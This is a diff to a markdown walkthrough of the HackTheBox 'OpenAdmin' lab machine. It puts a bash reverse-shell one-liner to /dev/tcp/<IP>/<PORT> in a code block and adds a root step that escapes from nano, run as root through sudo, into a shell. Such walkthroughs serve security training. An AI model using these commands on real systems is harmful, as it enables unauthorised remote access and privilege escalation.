@@ -43,8 +43,9 @@ python3 ona-rce.py check http://10.10.10.171/ona/
 ![](/images/whitefang/OpenAdmin_revshell.png)
 
 Sending reverse shell on our IP:
->/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
-
+```bash
+/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
+```
 ![](/images/whitefang/OpenAdmin_listen.png)
 
 
@@ -82,7 +83,13 @@ curl http://127.0.0.1:52846/main.php
 
 
 ## STEP_10 ==> ROOT
-
+  
+we can access /bin/nano as root without password.
+we can open the /opt/priv file using the nano to escalate to the user to root.
+```bash
+reset; sh 1>&0 2>&0
+```
+  
 ![](/images/whitefang/OpenAdmin_nano.png)
 
 ![](/images/whitefang/OpenAdmin_flag.png)
